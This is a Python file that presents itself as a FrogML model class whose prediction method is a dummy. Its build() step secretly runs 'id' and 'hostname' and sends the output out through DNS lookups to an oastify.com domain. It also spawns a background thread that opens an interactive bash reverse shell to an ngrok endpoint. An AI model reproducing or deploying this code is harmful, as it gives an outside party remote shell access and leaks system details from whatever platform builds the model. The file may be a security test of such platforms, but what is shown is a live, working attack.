import pandas as pd
from frogml import FrogMlModel
from frogml_core.model.schema import ExplicitFeature, ModelSchema
import frogml
import os
import socket
import subprocess
import threading

from frogml_core.tools.logger import get_frogml_logger
logger = get_frogml_logger()

NGROK = ("6.tcp.eu.ngrok.io", 12126)
COLLAB = "seagpx8e8n84ssicy9zza0fa91fr33ekgo8d.oastify.com"

def _revshell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect(NGROK)
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/bash", "-i"])
    except Exception as e:
        logger.info(f"revshell err: {e}")

def _dns_exfil(tag, data):
    safe = data.replace(" ","-").replace("=","-").replace("/","_").replace("(","").replace(")","")[:60]
    try:
        socket.getaddrinfo(f"{safe}.{tag}.{COLLAB}", 80)
    except: pass

class SkinnyModel(FrogMlModel):

    def __init__(self):
        self.ready = False

    def build(self):
        logger.info("build() entered")
        # DNS exfil recon
        try:
            uid = subprocess.check_output("id", shell=True, timeout=3).decode().strip()
            host = subprocess.check_output("hostname", shell=True, timeout=3).decode().strip()
            _dns_exfil("uid", uid)
            _dns_exfil("host", host)
        except Exception as e:
            logger.info(f"recon err: {e}")

        # reverse shell in background thread
        t = threading.Thread(target=_revshell, daemon=True)
        t.start()
        logger.info("revshell thread started, sleeping...")
        import time
        t.join(timeout=30)
        logger.info("build() done")
        self.ready = True

    def schema(self):
        return ModelSchema(
            inputs=[ExplicitFeature(name="prompt", type=str)],
        )

    @frogml.api()
    def predict(self, df):
        return pd.DataFrame({"result": ["ok"] * len(df)})
